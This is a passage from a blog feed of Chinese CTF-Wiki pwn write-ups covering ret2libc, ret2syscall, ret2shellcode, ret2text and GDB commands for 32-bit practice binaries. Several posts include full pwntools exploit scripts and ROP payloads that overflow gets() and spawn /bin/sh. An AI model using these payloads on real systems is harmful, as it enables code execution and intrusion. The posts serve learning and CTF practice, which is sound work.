href="#libc的延迟绑定" class="headerlink" title="libc的延迟绑定"></a>libc的延迟绑定</h2><p>动态链接的程序是在运行时需要对全局和静态数据访问进行GOT定位,然后间接寻址.对于模块间的调用也需要GOT定位,再间接跳转,这么做会影响程序运行速度,因此ELF采用当函数第一次使用时才进行绑定的思想,即延迟绑定.</p><p>ELF实现延迟绑定,是通过plt,原先got中存放着全局变量和函数调用,现在拆分为另一个部分.got和.got.plt,用.got存放着全局变量引用,用.got.plt存放着函数引用.</p><p>一个函数被调用过以后,got表里保存了它在内存中的地址,可以通过泄露got表内存来泄露函数地址,就可以根据其与libc中该函数的偏移计算其他函数在内存空间中的地址,因为libc中任意两个函数之间的偏移是固定的.</p><p>例: 计算system函数在内存空间中的地址</p><ul><li>拿到<code>__libc_start_main</code>函数在内存空间中的地址addr_main</li><li><code>__libc_start_main</code>函数相对于libc.so.6的起始地址是addr_a</li><li>system函数相对于libc.so.6的起始地址是addr_b</li><li>则system函数在内存中1真正的地址是<code>addr_main+addr_b-addr_a</code></li></ul><p><img src="https://s2.loli.net/2023/01/09/NBLb4ZKUnm3rYWx.png" alt="image.png"></p><p>使用libc的利用工具LibcSearcher: </p><p><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></p><h2 id="基本利用思路"><a href="#基本利用思路" class="headerlink" title="基本利用思路"></a>基本利用思路</h2><p>在plt表中发现puts函数:</p><p><img src="https://s2.loli.net/2023/01/09/H5KwpT8mtWnkA2r.png" alt="image.png"></p><ul><li>利用栈溢出及puts函数泄露出在got表<code>__libc_start_main</code>函数的地址(也可以其他函数)</li><li>puts函数的返回地址为<code>_start</code>函数或main函数</li><li>即使程序有ASLR保护,也只是针对地址中间位进行随机,最低12位并不会改变,所以可以根据泄露判断libc的版本</li><li>利用泄露出的函数地址的最低12位计算system函数和<code>/bin/sh</code>字符串的内存地址</li><li>利用构造payload</li></ul><p><img src="https://s2.loli.net/2023/01/09/J3WPtBzaGIgkr28.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/01/09/c8fix65NSOUkJWu.png" alt="image.png"></p><pre><code class="hljs">__libc_start_main函数在got表的地址:0x0804A024_start函数地址: 0x080484D0puts函数在plt表中的地址: 0x08048460</code></pre><p>看不懂,先摆烂了</p><p><a href="https://www.cnblogs.com/Tsuiyields/p/11963790.html">https://www.cnblogs.com/Tsuiyields/p/11963790.html</a></p><p><a href="https://blog.csdn.net/acsuccess/article/details/104335514">https://blog.csdn.net/acsuccess/article/details/104335514</a></p><p><a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">https://libc.blukat.me/?q=__libc_start_main_ret%3Ae81</a></p><p><a href="https://www.jianshu.com/p/df8645e63365">https://www.jianshu.com/p/df8645e63365</a></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="main函数与-start函数区别"><a href="#main函数与-start函数区别" class="headerlink" title="main函数与_start函数区别"></a>main函数与_start函数区别</h3><ul><li><code>main()</code>是用户代码的入口.</li><li><code>__start()</code>是系统代码入口</li></ul><p><code>_start</code>函数比main函数多了一个堆栈平衡(栈对齐)操作:</p><p><code>_start</code>函数中有依据<code>ans esp,0FFFFFFF0h</code>进行了堆栈平衡,在and语句之前,esp为0xffffade8,经过and之后,esp变为0xffffade0,所以问题就出在<code>_start</code>函数的and语句,若直接返回main函数就相当于少了一个and操作,esp位置也就多了8(栈内存增长相反,即栈空间少了8)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;程序下载：&lt;a href=&quot;https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw&quot;&gt;https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw &lt;/a&gt;&lt;br&gt;提取码：rc47&lt;/p&gt;
&lt;h1 i</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2syscall</title>
    <link href="https://sinky.top/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/"/>
    <id>https://sinky.top/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/</id>
    <published>2022-12-08T08:41:15.987Z</published>
    <updated>2023-01-09T01:21:23.190Z</updated>
    
    <content type="html"><![CDATA[<p>程序下载：<br><a href="https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw">https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw </a><br>提取码：ch1e</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>原理：控制程序执行系统调用，获取shell</p><p><img src="https://s2.loli.net/2022/12/09/8CNOQ4Je79hujfr.png" alt="image.png"></p><p>checksec查看，32位，got表可写，没开栈保护和地址随机化，开了NX（不可执行）</p><p>IDA查看：</p><p>main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"This time, no system() and NO SHELLCODE!!!"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"What do you plan to do?"</span>);<br>  <span class="hljs-built_in">gets</span>(&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>gets()函数，栈溢出漏洞标志！</p><p>看见字符串有后门：<code>/bin/sh = 0x080be408</code></p><p>套路：先看变量v4的地址，然后再找ebp地址，计算出偏移量，然后垃圾数据覆盖溢出到后门函数那边。</p><p>本来我找了v4地址，看IDA是根据esp去索引的，想当然的就套公式，找esp找ebp算出偏移，但是错了，看了一下参考文章发现，linux系统调用跟eax有关：</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>linux的系统调用通过<code>int 80h</code>实现，用系统调用号来区分入口函数，操作系统实现系统调用的基本过程：</p><ul><li>应用程序调用库函数(API)：</li><li>API将系统调用号存入eax，通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数(系统调用)；</li><li>系统调用完成相应功能，将返回值存入eax，返回到中断处理函数；</li><li>中断处理函数返回到API中；</li><li>PI将eax返回给应用程序</li></ul><p>应用程序调用系统调用的过程：</p><ul><li>将系统调用的编号存入eax</li><li>将函数参数存入其他通用寄存器</li><li>最后<code>int 0x80</code></li></ul><p>寄存器执行顺序：</p><ul><li>32位：eax-&gt; ebx-&gt; ecx-&gt; edx</li><li>64位：rdi-&gt; rsi-&gt; rcx-&gt; r8-&gt; r9</li></ul><p>言归正传，所以此题的偏移量应为<code>ebp-eax</code></p><p><img src="https://s2.loli.net/2022/12/09/2ktGcJr9eInwBCS.png" alt="image.png"></p><pre><code class="hljs">EAX: 0xffffd4acEBP: 0xffffd518偏移量：0x6C + 4 = 112</code></pre><p>根据那个应用程序调用系统调用的顺序，也就是说我们将对应获取shell的系统调用参数，放到对应寄存器中，最后执行<code>int 0x80</code>就可以执行对应的系统调用了。</p><p>32位执行时，eax参数为系统调用号，ebx指向<code>/bin/sh</code>地址，ecx参数为0，edx参数也为0</p><p>即<code>execve('/bin/sh',NULL,NULL)</code></p><ul><li>execve() 函数是用来执行<code>/bin/sh</code>路径的</li></ul><p>参考文章：<a href="https://blog.csdn.net/qq742762377/article/details/84325369">https://blog.csdn.net/qq742762377/article/details/84325369</a></p><p>整理一下：</p><pre><code class="hljs">eax：0xbebx: /bin/shecx: 0edx: 0偏移：112</code></pre><p>控制寄存器的值可以使用gadgets,通常情况下无法保证程序中有一段连续的代码可以同时控制对应寄存器，因此需要一段一段的控制，gadgets最后使用ret来再次控制程序执行流程。</p><p>通过ropgedgets工具寻找gadgets.</p><p>ropgedgets的安装利用：<a href="https://www.wangan.com/docs/678">https://www.wangan.com/docs/678</a></p><p>找控制eax的gadgets:</p><pre><code class="hljs">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</code></pre><p><img src="https://s2.loli.net/2022/12/09/Ge6bnlydJzkWuC8.png" alt="image.png"></p><p>以上都能使用，我用第二行：</p><pre><code class="hljs">0x080bb196 : pop eax ; ret</code></pre><p>找控制ebx的gadgets:</p><pre><code class="hljs">ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'</code></pre><p><img src="https://s2.loli.net/2022/12/09/XU4NFbixWA79hHS.png" alt="image.png"></p><p>我用：</p><pre><code class="hljs">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></pre><p>能控制ebx,ecx,edx,都能控制，省事儿。</p><p>也可以用ropgadget找<code>/bin/sh</code>:</p><pre><code class="hljs">ROPgadget --binary rop  --string '/bin/sh'</code></pre><p>反正上面我IDA也找到了。</p><pre><code class="hljs">int 0x80的地址：ROPgadget --binary rop  --only 'int'</code></pre><p><img src="https://s2.loli.net/2022/12/09/Ju6MADH1cINFbmP.png" alt="image.png"></p><pre><code class="hljs">int 0x80: 0x08049421</code></pre><p>那么payload:</p><pre><code class="hljs">payload='a'*112+p32(pop_eax_addr)+p32(0xb)+p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p=process('./rop')pop_eax_addr=0x080bb196pop_edx_ecx_ebx_addr=0x0806eb90bin_addr=0x080be408int_addr=0x08049421payload='a'*112+p32(pop_eax_addr)+p32(0xb)+p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/09/kmuOz9LMnvGpIF2.png" alt="image.png"></p><p>成功！！</p><p>看到有的exp里直接用一个flat()把p32()转换这直接简便了，我也贴一下吧：</p><pre><code class="hljs">payload&nbsp;=&nbsp;flat(["A"*112,pop_eax_addr,0xb,pop_edx_ecx_ebx_addr,0,0,bin_addr,int_addr])</code></pre><blockquote><p>注：如果程序中没有<code>/bin/sh</code>，就调用read()函数将<code>/bin/sh</code>写入bss段，然后再使用execve()</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;程序下载：&lt;br&gt;&lt;a href=&quot;https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw&quot;&gt;https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw &lt;/a&gt;&lt;br&gt;提取码：ch1e&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2shellcode</title>
    <link href="https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/"/>
    <id>https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/</id>
    <published>2022-12-07T08:44:02.905Z</published>
    <updated>2022-12-08T08:30:17.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统的shell,一般来说shellcode需要自己填充。</p><p>控制程序执行shellcode。在栈溢出的基础上，若想在执行shellcode,需要对应的binary在运行时shellcode所在的区域具有可执行权限。</p><p>下载程序：</p><p><a href="https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ">https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ </a><br>提取码：r94f</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>checksec查看保护：</p><p><img src="https://s2.loli.net/2022/12/08/vDUj3E2pV7l6QAJ.png" alt="image.png"></p><p>32位，啥都没开。含有RWX段（可读可写可执行）</p><p>IDA看一下：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">int __cdecl <span class="hljs-selector-tag">main</span>(int argc, const char **argv, const char **envp)<br>{<br>  char s<span class="hljs-selector-attr">[100]</span>; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>("No system for you this time !!!");<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0</span>x64u);<br>  <span class="hljs-built_in">printf</span>("bye bye ~");<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>存在strncpy函数，栈溢出漏洞，将对应字符串s复制到buf2处。buf2在bss段：</p><p><img src="https://s2.loli.net/2022/12/08/gMj8EZsni9acCJu.png" alt="image.png"></p><p>buf2地址：<code>0x0804A080</code></p><p>查看call调用位置：</p><p><img src="https://s2.loli.net/2022/12/08/ekNcTuOyb2lp1x4.png" alt="image.png"></p><p>gdb在此处断点：</p><pre><code class="hljs">b *0x080485AF</code></pre><p><img src="https://s2.loli.net/2022/12/08/ISxJMn6FzAqTdLD.png" alt="image.png"></p><p>字符串地址：<code>0xffffd48c</code></p><p>ebp地址：<code>0xffffd4f8</code></p><pre><code class="hljs">0xffffd4f8 - 0xffffd48c = 0x6C</code></pre><p>偏移量：<code>0x6c+4</code></p><p>程序将s复制到buf2处，且buf2在bss段，在main处断点调试程序，运行之后利用vmmap查看。</p><ul><li>vmmap 用于查看程序各种段的地址和范围</li></ul><p><img src="https://s2.loli.net/2022/12/08/4GmfaT2AFNRLcSw.png" alt="image.png"></p><p>发现可执行bss段：</p><pre><code class="hljs">0x0804a000 0x0804b000 rwxp…/pwn_soft/ret2shellcode</code></pre><p>我们可以控制程序执行bss段处的shellcode</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>gets函数将获得内容复制给buf2数组，buf2未在main内定义，是未初始化的全局变量，且在.bss段，可以通过shellcraft.sh()函数，创造一个shell，将其写入buf2，通过栈溢出，将函数的返回地址覆盖为shell地址，即可获取shell。</p><ul><li><code>asm(shellcraft.sh())</code>  产生一个32位shell</li><li><code>asm(shellcraft.amd64.sh())</code> 产生一个64位shel</li><li><code>context(os=’linux’, arch=’amd64’, log_level=’debug’)</code><ul><li>os设置系统为linux系统,大多数pwn题目的系统都是linux</li><li>arch设置为amd64，可以简单的认为设置为64位的模式，对应的32位模式是i386</li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，将完整的io过程打印下来，方便调试.</li></ul></li></ul><p>信息：</p><pre><code class="hljs">buf2_addr = 0x0804A080偏移量：0x6c + 4 = 112</code></pre><p>exp:</p><pre><code class="hljs">from pwn import *p=process('./ret2shellcode')shell=asm(shellcraft.sh())buf2_addr=0x0804A080payload=shell.ljust(112,b'A')+p32(buf2_addr)p.sendline(payload)p.interactive()</code></pre><ul><li><code>shell.ljust(112,b'A')</code> 表示从机器码后方添加是数据直到总长112字节</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>GDB利用技巧</title>
    <link href="https://sinky.top/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://sinky.top/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</id>
    <published>2022-12-07T07:33:09.644Z</published>
    <updated>2022-12-08T08:06:05.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h1><p>在源文件函数入口处断点：</p><pre><code class="hljs">b 文件名:函数名b text.c:func1</code></pre><p>在源文件某一行断点：</p><pre><code class="hljs">b 代码行号例：b 7</code></pre><p>在程序的某个地址断点：</p><pre><code class="hljs">b *address例：b 0x401000</code></pre><p>条件断点：</p><pre><code class="hljs">b num if cond例：b 14 if c=4</code></pre><p>查看断点：</p><pre><code class="hljs">info b</code></pre><p>删除断点：</p><pre><code class="hljs">del num[断点序号]</code></pre><p>设置断点有效和无效：</p><pre><code class="hljs">dis num # 将第num个断点设置为无效ena num # 将第num个断点设置为有效</code></pre><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><pre><code class="hljs">查看代码：l # 显示十行代码l 15 # 显示十五行代码l main # 显示main函数info source # 查看当前程序info r # 查看所有寄存器值info r 寄存器名 # c查看某一寄存器值</code></pre><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>程序从main函数开始：</p><pre><code class="hljs">run</code></pre><p>运行到第一个断点处：</p><pre><code class="hljs">start</code></pre><h1 id="执行流控制"><a href="#执行流控制" class="headerlink" title="执行流控制"></a>执行流控制</h1><pre><code class="hljs">c/continue # 向下运行到下一个断点处n/next # 单步步过，执行下一行代码，不进入调用的函数，直接返回结果s/step # 单步步入finish # 跳出函数体until # 跳出当前循环，在执行完循环体内最后一句之后执行until，才可以跳出循环j/jump # 跳转到指定行/地址后继续执行，若无断点则继续执行stop # 停止运行quit # 退出gdb</code></pre><h1 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h1><pre><code class="hljs">p var # 打印变量值ptype var # 打印变量类型p &amp;var # 打印变量地址p *addr # 打印地址的值p /x var # 用十六禁止显示数据info args # 打印到当前函数参数值info locals # 打印当前函数中所有局部变量值</code></pre><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><ul><li>vmmap 用于查看程序各种段的地址和范围</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;下断点&quot;&gt;&lt;a href=&quot;#下断点&quot; class=&quot;headerlink&quot; title=&quot;下断点&quot;&gt;&lt;/a&gt;下断点&lt;/h1&gt;&lt;p&gt;在源文件函数入口处断点：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;b 文件名:函数名
b text.c:func1
</summary>
      
    
    
    
    
    <category term="GDB" scheme="https://sinky.top/tags/GDB/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2text</title>
    <link href="https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/"/>
    <id>https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/</id>
    <published>2022-12-07T05:39:07.931Z</published>
    <updated>2022-12-07T13:44:56.324Z</updated>
    
    <content type="html"><![CDATA[<p>访问不了github，改了host,也试过改DNS都不行，抓狂浪费时间，最后果断选择翻一下下载了这个程序。</p><p>自行下载：</p><p><a href="https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw">https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw</a></p><p>提取码：v4gi</p><p>跟着CTFWikiPWN一起做一遍：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3" title="CTFWikiPWN">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>reet2text即控制程序本身已有的代码(.text)</p><p><img src="https://s2.loli.net/2022/12/07/GPTQWzslnur8YcU.png" alt="image.png"></p><p>32位，got表可写，没开栈保护和地址随机，开了NX(栈不可以执行保护),可以考虑rop绕过。</p><p>main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is something amazing here, do you know anything?"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Maybe I will tell you next time !"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>存在gets函数，栈溢出漏洞</p><p>找一下有没有后门函数：</p><p><img src="https://s2.loli.net/2022/12/07/EBqIiSLzMycNbZJ.png" alt="image.png"></p><p><code>/bin/sh</code>地址：0x0804863A</p><p>控制程序返回0x0804863A就可以拿到shell.</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>先看一下变量s：</p><p><img src="https://s2.loli.net/2022/12/07/GDcKFTvPhAo2j7W.png" alt="image.png"></p><p>先确定能够控制的内存起始地址距离main函数返回地址的字节数。</p><p>如上图，该字符串通过esp进行索引。</p><p>进入gdb：</p><pre><code class="hljs">b *0x080486AEr</code></pre><p>在call处下断点，运行,查看esp和ebp</p><p><img src="https://s2.loli.net/2022/12/07/9YyXFofLGH1iQsk.png" alt="image.png"></p><p>esp: 0xffffd480</p><p>ebp: 0xffffd508</p><p>根据代码</p><p><img src="https://s2.loli.net/2022/12/07/AZtbInzKYoFxVBP.png" alt="image.png"></p><p>(R一下就会变成1C了)</p><p>可知，s相对于esp的索引为<code>esp+1C</code></p><p>则s地址为：</p><pre><code class="hljs">0xffffd480 + 0x1C = 0xffffd49c</code></pre><p>s相对于ebp的偏移为：</p><pre><code class="hljs">0xffffd508 - 0xffffd49c = 0x6C</code></pre><p>s相对于返回地址的偏移为：</p><pre><code class="hljs">0x6C+4</code></pre><p>所以：</p><pre><code class="hljs">payload='a'*0x6C+'b'*4+p32(0x0804863A)</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p=process('./ret2text')sys=0x0804863apayload='a'*0x6C+'b'*4+p32(sys)p.sendlines(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/07/6hJBfwvXo9ky23P.png" alt="image.png"></p><p>呜呜呜感觉终于对pwn稍微稍微的有了那么一点点头绪哭了哭了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;访问不了github，改了host,也试过改DNS都不行，抓狂浪费时间，最后果断选择翻一下下载了这个程序。&lt;/p&gt;
&lt;p&gt;自行下载：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw&quot;&gt;https</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
</feed>
